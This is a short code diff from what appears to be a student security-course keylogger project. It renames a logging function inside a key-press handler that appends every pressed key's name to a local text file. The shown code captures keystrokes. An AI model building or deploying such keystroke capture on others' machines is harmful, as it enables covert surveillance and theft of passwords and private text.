@@ -15,7 +15,7 @@ def get_key_name(key):
 def on_press(key):
     log = open("/Users/victorzhang/Documents/Computing/COMP6411/keylogger/fullLogs.txt", 'a')
     key_name = get_key_name(key)
-    writeToLog(log, format(key_name))
+    write_to_log(log, format(key_name))
     # print('Key {} pressed.'.format(key_name))
 
 
